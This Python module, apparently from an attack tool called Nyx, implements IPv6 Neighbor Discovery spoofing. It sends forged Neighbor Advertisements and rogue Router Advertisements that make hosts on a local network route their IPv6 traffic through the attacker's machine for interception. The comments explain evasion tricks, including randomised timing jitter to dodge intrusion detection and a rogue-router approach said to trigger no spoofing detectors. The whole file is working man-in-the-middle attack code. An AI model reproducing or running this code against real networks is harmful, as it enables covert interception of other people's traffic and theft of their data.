import asyncio
import ipaddress
import logging
import platform
import random
import socket
import subprocess

from modules.arp_spoof import _get_local_ip, _get_mac

logger = logging.getLogger(__name__)


def _get_local_ipv6_linklocal() -> str | None:
    """Return the interface's link-local IPv6 address (fe80::/10).

    NDP messages MUST be sourced from a link-local address; a global unicast
    source (or ``::``) makes many stacks silently drop the packet.
    """
    try:
        for info in socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET6):
            ip = info[4][0].split("%")[0]
            if ip.startswith("fe80:"):
                return ip
    except Exception as e:
        logger.debug("IPv6 link-local detection failed: %s", e)
    return None


def _get_ipv6_mac(ip6: str, local_mac: str | None = None, timeout: float = 1.5) -> str | None:
    """Resolve the MAC of an IPv6 address via Neighbor Discovery."""
    try:
        from scapy.layers.inet6 import getmacbyip6
        mac = getmacbyip6(ip6)
        if mac:
            return mac
    except Exception as e:
        logger.debug("getmacbyip6 failed for %s: %s", ip6, e)
    # Fallback: manual Neighbor Solicitation (multicast solicited-node).
    if not local_mac:
        return None
    try:
        from scapy.all import (
            Ether, ICMPv6ND_NA, ICMPv6ND_NS, ICMPv6NDOptSrcLLAddr, IPv6, srp,
        )
        clean = ip6.split("%")[0]
        last3 = ipaddress.ip_address(clean).packed[-3:]
        mcast = "33:33:ff:%02x:%02x:%02x" % tuple(last3)
        pkt = (
            Ether(dst=mcast)
            / IPv6(src=_get_local_ipv6_linklocal() or "::", dst=clean)
            / ICMPv6ND_NS(tgt=clean)
            / ICMPv6NDOptSrcLLAddr(lladdr=local_mac)
        )
        ans, _ = srp(pkt, timeout=timeout, verbose=0)
        for _, rcv in ans:
            if ICMPv6ND_NA in rcv:
                return rcv[Ether].src
    except Exception as e:
        logger.debug("Manual NS failed for %s: %s", ip6, e)
    return None


def _detect_ipv6_gateway() -> str | None:
    """Best-effort IPv6 default-router detection per platform."""
    sys_platform = platform.system().lower()
    try:
        if sys_platform == "linux":
            out = subprocess.check_output(
                "ip -6 route show default", shell=True, timeout=5,
            ).decode("utf-8", errors="replace")
            parts = out.strip().split()
            for i, p in enumerate(parts):
                if p == "via" and i + 1 < len(parts):
                    return parts[i + 1].split("%")[0]
        elif sys_platform == "windows":
            out = subprocess.check_output(
                "netsh interface ipv6 show route", shell=True, timeout=5,
            ).decode("utf-8", errors="replace")
            for line in out.splitlines():
                if "::/0" in line:
                    parts = line.strip().split()
                    if len(parts) >= 2:
                        gw = parts[-1].split("%")[0]
                        try:
                            ipaddress.IPv6Address(gw)
                            return gw
                        except Exception:
                            return None
        else:  # darwin and other unix
            out = subprocess.check_output(
                "netstat -rn -f inet6", shell=True, timeout=5,
            ).decode("utf-8", errors="replace")
            for line in out.splitlines():
                if line.startswith("default"):
                    parts = line.strip().split()
                    if len(parts) >= 2:
                        return parts[1].split("%")[0]
    except Exception as e:
        logger.debug("IPv6 gateway detection failed: %s", e)
    return None


def is_ipv6(ip: str) -> bool:
    try:
        return ipaddress.ip_address(ip.split("%")[0]).version == 6
    except Exception:
        return False


class NDPSpoofer:
    """NDP (IPv6 Neighbor Discovery) poisoning — the IPv6 equivalent of ARP
    spoofing. Sends forged ICMPv6 Neighbor Advertisements so targets resolve
    the IPv6 router (and each other) to our MAC, rerouting their traffic
    through this machine for transparent interception.

    Stealth improvements mirror the ARP spoofer:
    - Randomised interval (base ± jitter) prevents timing-based IDS detection.
    - Restore sends 3 gratuitous NAs per target to ensure the target's
      neighbor cache is actually corrected on teardown.
    """

    # Base interval between NDP poison rounds (seconds)
    _BASE_INTERVAL: float = 3.0
    # Maximum random jitter added/subtracted from the base interval
    _JITTER: float = 1.5

    def __init__(self, target_ips: list[str], gateway_ip6: str | None = None, interval: float = 3.0, spoof_gateway_cache: bool = False):
        self.target_ips = [ip for ip in target_ips if is_ipv6(ip)]
        self.gateway_ip6 = gateway_ip6 or self._detect_gateway()
        self.interval = interval
        # Bidirectional (gateway-cache) poisoning is OFF by default, mirroring
        # the ARP spoofer: poisoning the router's neighbor cache is far more
        # detectable and can get the attacker quarantined.
        self.spoof_gateway_cache = spoof_gateway_cache
        self._running = False
        self._task: asyncio.Task | None = None
        # NDP must be sourced from the link-local address.
        self._local_ip6 = _get_local_ipv6_linklocal()
        # MAC is shared between IPv4 and IPv6 on the same interface.
        self._local_mac: str | None = None

    @staticmethod
    def _detect_gateway() -> str | None:
        return _detect_ipv6_gateway()

    async def start(self) -> None:
        if self._running:
            return
        self._running = True
        if self._local_ip6:
            local_ipv4 = _get_local_ip()
            self._local_mac = await asyncio.to_thread(_get_mac, local_ipv4)
            if not self._local_mac:
                logger.warning("Could not determine local MAC address for NDP spoofing")
        else:
            logger.warning("No local IPv6 address found — NDP spoofing will not send packets")
        self._task = asyncio.create_task(self._spoof_loop())

    async def stop(self) -> None:
        self._running = False
        if self._task:
            self._task.cancel()
            try:
                await self._task
            except asyncio.CancelledError:
                pass
            self._task = None
        await self._restore_ndp()

    @staticmethod
    def _solicited_node_mac(ip6: str) -> str:
        last3 = ipaddress.ip_address(ip6.split("%")[0]).packed[-3:]
        return "33:33:ff:%02x:%02x:%02x" % tuple(last3)

    def _send_na(self, target_ip6: str, spoof_ip6: str, target_mac: str | None = None, lladdr: str | None = None) -> None:
        """Send a forged Neighbor Advertisement claiming spoof_ip6 lives at our MAC."""
        try:
            from scapy.all import (
                Ether, ICMPv6ND_NA, ICMPv6NDOptDstLLAddr, IPv6, sendp,
            )
            if not self._local_mac:
                return
            pkt = (
                Ether(dst=target_mac or self._solicited_node_mac(target_ip6))
                / IPv6(src=self._local_ip6 or "::", dst=target_ip6)
                / ICMPv6ND_NA(tgt=spoof_ip6, R=0, S=0, O=1)
                / ICMPv6NDOptDstLLAddr(lladdr=lladdr or self._local_mac)
            )
            sendp(pkt, verbose=0)
            logger.info(
                "NDP NA sent: %s -> %s (claiming %s is at %s)",
                target_ip6, target_mac or self._solicited_node_mac(target_ip6),
                spoof_ip6, lladdr or self._local_mac,
            )
        except PermissionError:
            logger.error("NDP spoofing requires admin/root privileges. Run Nyx as administrator.")
        except Exception as e:
            logger.warning("NDP NA send failed for %s: %s", target_ip6, e)

    def _send_ra(self) -> None:
        """Send a forged IPv6 Router Advertisement declaring THIS machine as
        the IPv6 default router (equivalent of an IPv4 DHCP offer that makes
        us the gateway). Targets that honour the RA will route ALL IPv6
        traffic through us without any Neighbor poisoning — the phone treats
        us as a legitimate router, so IPv6 interception triggers none of the
        ARP/NDP spoofing detectors.
        """
        try:
            from scapy.all import (
                Ether, ICMPv6ND_RA, ICMPv6NDOptPrefixInfo, ICMPv6NDOptSrcLLAddr,
                IPv6, sendp,
            )
            if not self._local_mac or not self._local_ip6:
                return
            # All-nodes multicast (ff02::1) — every host on the link receives it.
            pkt = (
                Ether(dst="33:33:00:00:00:01")
                / IPv6(src=self._local_ip6, dst="ff02::1", hlim=255)
                / ICMPv6ND_RA(
                    M=0, O=0, H=0, Prf=1,  # High default-router preference
                    routerlifetime=1800,
                    reachabletime=0,
                    retranstimer=0,
                )
                / ICMPv6NDOptSrcLLAddr(lladdr=self._local_mac)
            )
            # Prefix info: advertise the on-link prefix so hosts pick us as
            # their gateway for their /64 network.
            try:
                import ipaddress as _ipa
                local = _ipa.ip_address(self._local_ip6)
                prefix = str(_ipa.ip_network(f"{local}/64", strict=False))
                pkt /= ICMPv6NDOptPrefixInfo(
                    prefixlen=64, L=1, A=1, validlifetime=1800,
                    preferredlifetime=900, prefix=prefix.split("/")[0],
                )
            except Exception:
                pass
            sendp(pkt, verbose=0)
            logger.info("NDP RA sent: declared %s as IPv6 default router", self._local_ip6)
        except PermissionError:
            logger.error("NDP RA requires admin/root privileges. Run Nyx as administrator.")
        except Exception as e:
            logger.warning("NDP RA send failed: %s", e)

    async def _spoof_loop(self) -> None:
        while self._running:
            try:
                # Always (re)announce ourselves as the IPv6 router — cheap and
                # stealthy (routers legitimately send RAs on a schedule).
                self._send_ra()

                for target_ip6 in self.target_ips:
                    target_mac = await asyncio.to_thread(_get_ipv6_mac, target_ip6, self._local_mac)
                    if not target_mac:
                        logger.warning("Could not resolve MAC for target %s — sending multicast NA", target_ip6)
                    gateway_mac = None
                    if self.gateway_ip6:
                        gateway_mac = await asyncio.to_thread(_get_ipv6_mac, self.gateway_ip6, self._local_mac)
                        if not gateway_mac:
                            logger.warning("Could not resolve MAC for gateway %s", self.gateway_ip6)
                    # Claim the gateway is at our MAC (target's cache).
                    if self.gateway_ip6:
                        self._send_na(target_ip6, self.gateway_ip6, target_mac)
                    # Claim the target is at our MAC (gateway's cache) — only
                    # when explicitly requested (unidirectional by default).
                    if self.gateway_ip6 and self.spoof_gateway_cache:
                        self._send_na(self.gateway_ip6, target_ip6, gateway_mac)
            except Exception as e:
                logger.warning("NDP spoof iteration error: %s", e)

            # Randomised sleep: base interval ± jitter to avoid timing-based IDS
            jitter = random.uniform(-self._JITTER, self._JITTER)
            sleep_time = max(1.0, self._BASE_INTERVAL + jitter)
            await asyncio.sleep(sleep_time)

    async def _restore_ndp(self) -> None:
        """Send genuine NAs to restore correct neighbor-cache entries.

        Sends each packet 3 times with a small delay to ensure delivery even
        on lossy links.
        """
        try:
            if not self.gateway_ip6:
                return
            gateway_mac = await asyncio.to_thread(_get_ipv6_mac, self.gateway_ip6, self._local_mac)
            for target_ip6 in self.target_ips:
                target_mac = await asyncio.to_thread(_get_ipv6_mac, target_ip6, self._local_mac)
                if target_mac and gateway_mac:
                    from scapy.all import (
                        Ether, ICMPv6ND_NA, ICMPv6NDOptDstLLAddr, IPv6, sendp,
                    )
                    for _ in range(3):
                        # Gateway -> target: gateway is at its real MAC.
                        sendp(
                            Ether(dst=target_mac)
                            / IPv6(src=self.gateway_ip6, dst=target_ip6)
                            / ICMPv6ND_NA(tgt=self.gateway_ip6, R=0, S=1, O=1)
                            / ICMPv6NDOptDstLLAddr(lladdr=gateway_mac),
                            verbose=0,
                        )
                        # Target -> gateway: target is at its real MAC.
                        sendp(
                            Ether(dst=gateway_mac)
                            / IPv6(src=target_ip6, dst=self.gateway_ip6)
                            / ICMPv6ND_NA(tgt=target_ip6, R=0, S=1, O=1)
                            / ICMPv6NDOptDstLLAddr(lladdr=target_mac),
                            verbose=0,
                        )
                        await asyncio.sleep(0.1)
                    logger.info("NDP restored for %s (3x)", target_ip6)
        except Exception as e:
            logger.debug("NDP restore failed: %s", e)
